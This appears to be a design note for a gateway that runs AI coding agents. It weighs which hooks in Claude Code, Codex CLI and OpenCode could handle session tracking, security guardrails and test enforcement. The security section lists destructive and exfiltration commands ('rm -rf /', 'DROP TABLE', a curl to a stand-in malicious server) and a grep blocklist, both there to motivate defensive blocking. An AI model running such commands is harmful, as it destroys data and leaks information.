# Backend Hooks Strategy

**Last Updated:** 2026-06-06

Analysis of whether backend lifecycle hooks (Claude Code, Codex CLI, OpenCode) can replace or supplement the gateway's current agent state management — and what's worth actually doing.

---

## TL;DR

**The current approach (external orchestration: JSON state files, subprocess management, stdout parsing) is architecturally correct for what it does.** Hooks run *inside* each backend's process context and cannot replace gateway-level concerns like Telegram binding, multi-backend routing, mesh dispatch, or crash recovery.

However, **3 specific things the gateway currently does are genuinely fragile** and hooks do better:

| Fragile thing | Current approach | Hook fix |
|---------------|-----------------|----------|
| Session ID extraction | Regex-parsing backend stdout for `session_id` / `thread_id` | `SessionStart` hook writes it to a known file atomically |
| Security guardrails | None — backend has free rein inside a session | `PreToolUse` (exit code 2) blocks dangerous commands deterministically |
| Code quality enforcement | Prompt-dependent ("please run tests") | `PostToolUse` runs linters/tests after every tool call, 100% reliable |

Everything else (state persistence, Telegram, mesh, recovery) — keep as-is. Hooks don't solve those problems.

---

## Hook availability by backend

### Claude Code (18–27+ events)

| Hook event | Fires | Can block? | Handler types |
|------------|-------|-----------|---------------|
| `SessionStart` | Session begins or resumes | No | command, prompt, agent, HTTP |
| `UserPromptSubmit` | User submits a prompt | Yes | command, prompt, agent, HTTP |
| `PreToolUse` | Before any tool call | Yes | command, prompt, agent, HTTP |
| `PostToolUse` | After tool succeeds | No | command, prompt, agent, HTTP |
| `PostToolUseFailure` | After tool fails | No | command, prompt, agent, HTTP |
| `Stop` | Claude finishes responding | Yes | command, prompt, agent, HTTP |
| `Notification` | Claude sends notifications | No | command, prompt, agent, HTTP |
| `PreCompact` | Before context compaction | No | command, prompt, agent, HTTP |
| `SubagentStart`, `SubagentStop` | Sub-agent lifecycle | Yes | command, prompt, agent, HTTP |
| `PermissionRequest` | User permission needed | Yes | command, prompt, agent, HTTP |
| `SessionEnd` | Session ends | No | command, prompt, agent, HTTP |
| `TaskCompleted` | A task completes | No | command, prompt, agent, HTTP |
| `ConfigChange` | Config changes at runtime | No | command, prompt, agent, HTTP |

**Config file:** `.claude/settings.json` (project) or `~/.claude/settings.json` (user)

### Codex CLI (5–6 events, experimental, feature-flagged)

| Hook event | Fires | Can block? | Handler types |
|------------|-------|-----------|---------------|
| `SessionStart` | Session begins | No | command (parallel) |
| `UserPromptSubmit` | User submits a prompt | Yes | command (parallel) |
| `PreToolUse` | Before shell tool call | Yes | command (parallel) |
| `PostToolUse` | After shell tool returns | No | command (parallel) |
| `Stop` | Session ends | Yes | command (parallel) |

**Limitations (as of v0.128):**
- Hooks fire **only for `shell` (Bash) tool calls** — NOT for `apply_patch` file edits or MCP tools
- Feature-flagged (off by default)
- Not available on Windows
- Fewer events than Claude, but growing fast (5 events as of March 2026)

**Config file:** `~/.codex/hooks.json`

### OpenCode (25+ plugin events, mature)

OpenCode doesn't have a "hooks config" like Claude/Codex — instead it has a full TypeScript plugin system:

| Hook event | Fires | Handler type |
|------------|-------|-------------|
| `tool.execute.before` | Before any tool call | TypeScript callback |
| `tool.execute.after` | After any tool call | TypeScript callback |
| `message.created` | New message in conversation | TypeScript callback |
| `file.changed` | After file mutation tools | TypeScript callback |
| `session.created` | Session starts | TypeScript callback |
| ... 20+ more | Various lifecycle points | TypeScript callback |

**Config:** `.opencode/plugins/*.ts` (local) or npm packages in `opencode.json`

---

## What the gateway currently does vs. what hooks can do

### Layer 1 — Things hooks CANNOT replace (gateway-level concerns)

| Concern | Why hooks can't touch it |
|---------|-------------------------|
| Telegram ↔ session binding | Hooks run inside backend process; they have no concept of Telegram chat IDs |
| Multi-backend routing | Hooks are per-backend config — Claude hooks don't know about Codex or OpenCode |
| Session persistence (JSON + SQLite) | Hooks fire and forget; they don't write to the gateway's state files |
| Mesh network dispatch | Hooks are local to one process; mesh routing happens at the orchestrator level |
| Crash recovery | Hooks die when the backend process dies |
| File watcher (.task.md) | Entirely external to any backend process |
| Task queue (asyncio.Queue) | Gateway-internal mechanism |

### Layer 2 — Things hooks CAN replace (and the current approach is fragile)

#### 2a. Session ID extraction (high value, low effort)

**Current (fragile):** Each backend parses stdout with regex to extract the native session ID:

- `claude_code.py:580` — parses JSON from `claude --print-system-summary`
- `codex.py:312` — parses NDJSON events for `thread_id`
- `opencode.py` — tries multiple JSON field shapes

**Hook fix:** `SessionStart` hook writes `{"session_id": "..."}` to a well-known file path (e.g., `state/backend_sessions/<gateway_session_id>.json`). Gateway reads that file instead of parsing stdout.

**Because:** The stdin/stdout contract for `SessionStart` hooks is deterministic JSON. No regex, no fragile parsing, no race with terminal noise.

**Status:** Available on all 3 backends.

#### 2b. Security guardrails (high value, medium effort)

**Current (nonexistent):** Once the gateway launches a backend session, the backend has full freedom to run any command, edit any file, access any resource. There is zero protection against:

```
rm -rf /  # would just work
DROP TABLE production;  # would just work
curl http://malicious-server/exfiltrate  # would just work
```

**Hook fix:** `PreToolUse` hook checks `$CLAUDE_TOOL_INPUT` (or equivalent) against a blocklist. Exit code 2 = block the call.

```json
{
  "hooks": {
    "PreToolUse": [{
      "matcher": "Bash",
      "hooks": [{
        "type": "command",
        "command": "echo \"$CLAUDE_TOOL_INPUT\" | grep -qE 'rm -rf|DROP TABLE|shutdown|format' && exit 2 || exit 0"
      }]
    }]
  }
}
```

**Status:** Claude Code (mature), Codex CLI (`shell` tool only), OpenCode (via plugin `tool.execute.before`).

#### 2c. Code quality enforcement (medium value, low effort)

**Current (prompt-dependent):** The gateway's system prompt asks the backend to run tests, but the LLM can forget or skip. No enforcement mechanism.

**Hook fix:** `PostToolUse` hook runs `npm test` (or `ruff`, `mypy`, etc.) after every `Write`/`Edit`/`MultiEdit` tool call. Exit code 2 = Claude sees the failure and must fix it.

**Status:** Claude Code (mature), Codex CLI (`shell` only, so limited), OpenCode (via plugin).

### Layer 3 — Things hooks COULD add (new capabilities)

| Capability | Hook | What it does | Value |
|-----------|------|-------------|-------|
| Deterministic context injection | `UserPromptSubmit` | Inject branch name, recent changes, or gateway instructions every turn, not just the first | Medium |
| Command audit log | `PreToolUse` | Log every shell command to the gateway's event pipeline | Medium |
| Remote permission approval | `PermissionRequest` (Claude only) | Route permission prompts to Telegram for human approve/deny | High (but big effort) |
| Stop guard | `Stop` | Prevent Claude from stopping before tests pass | Medium (risk of loops) |

---

## Recommended implementation order

### Task A — SessionStart hook for session ID detection ⭐

**Why first:** Replaces the most fragile code in the current backends. Small, self-contained, eliminates a class of bugs where session ID parsing fails on unexpected output.

**What to do:**
1. Pick one backend (Claude Code, since it has the richest hook support)
2. Write a small script (`scripts/hooks/session_start.py`) that writes `{"backend_session_id": "<id>", "cwd": "<cwd>"}` to `state/backend_sessions/<gateway_session_id>.json`
3. Register it in the backend's hook config (`.claude/settings.json`, `.codex/hooks.json`, or `.opencode/plugins/`)
4. Modify the backend implementation to read session ID from the file instead of parsing stdout
5. Repeat for other backends

**Backend support:** All 3 backends support `SessionStart` hooks.

### Task B — PreToolUse security guardrails

**Why second:** Closes a real security gap. The gateway currently trusts the backend entirely.

**What to do:**
1. Define a blocklist of dangerous patterns (`rm -rf`, `DROP TABLE`, `shutdown`, etc.)
2. Write a `PreToolUse` hook script that checks `$CLAUDE_TOOL_INPUT` (or equivalent)
3. Register it in the hook config
4. Add gateway-level logging when a command is blocked

**Backend support:** Claude Code (full), Codex CLI (`shell` only), OpenCode (via plugin).

### Task C — PostToolUse code quality gates

**Why third:** Most valuable once the gateway is used for unattended/automated operation.

**What to do:**
1. Write a `PostToolUse` hook that runs `npm test` / `ruff` / `mypy` on modified files
2. Register it with matcher for `Write|Edit|MultiEdit` tool calls
3. Hook captures output; on failure (exit code 2), Claude sees the failure and attempts a fix

**Backend support:** Claude Code (full), OpenCode (via plugin). Codex CLI only fires hooks for `shell` tool calls, so this won't work reliably there yet.

---

## What NOT to do

- **Don't try to replace state persistence with hooks.** Hooks are fire-and-forget scripts. They don't write to the gateway's JSON/SQLite state, and they can't survive a process crash.
- **Don't wire hooks into the mesh path.** Hooks are per-machine config. The mesh is about cross-machine coordination. They're orthogonal concerns.
- **Don't use `Stop` hooks for auto-continuation nudges (yet).** The risk of infinite loops or autonomy drift outweighs the benefit. Reevaluate after Tasks A–C are proven.
- **Don't build a cross-backend hook abstraction layer.** Each backend has different events, different config formats, different capabilities. Abstracting them adds complexity without proportional value.

---

## Relationship to existing code

| Backend file | What's fragile | Hook replaces |
|-------------|---------------|---------------|
| `src/backends/claude_code.py` | `session_id` extraction from stdout | `SessionStart` → known file |
| `src/backends/codex.py` | `thread_id` extraction from NDJSON | `SessionStart` → known file |
| `src/backends/opencode.py` | session ID from various JSON shapes | `session.created` → known file |

Hooks are configured PER BACKEND in their respective config files (`.claude/settings.json`, etc.). The gateway doesn't need to install or manage hooks beyond ensuring the hook config files exist in the right places.

---

## References

- [Claude Code hooks docs](https://docs.anthropic.com/en/docs/claude-code/hooks)
- [Claude Code hooks: 18 lifecycle events](https://www.mindstudio.ai/blog/claude-code-hooks-18-lifecycle-events-most-users-never-touched-how-to-use-them)
- [Codex CLI hooks — events, policy, patterns](https://codex.danielvaughan.com/2026/04/15/codex-cli-hooks-complete-guide-events-policy-patterns/)
- [OpenCode plugins docs](https://open-code.ai/en/docs/plugins)
- [OpenCode plugin development guide](https://lushbinary.com/blog/opencode-plugin-development-custom-tools-hooks-guide/)
- [GitButler Claude Code hooks integration](https://docs.gitbutler.com/features/ai-integration/claude-code-hooks)
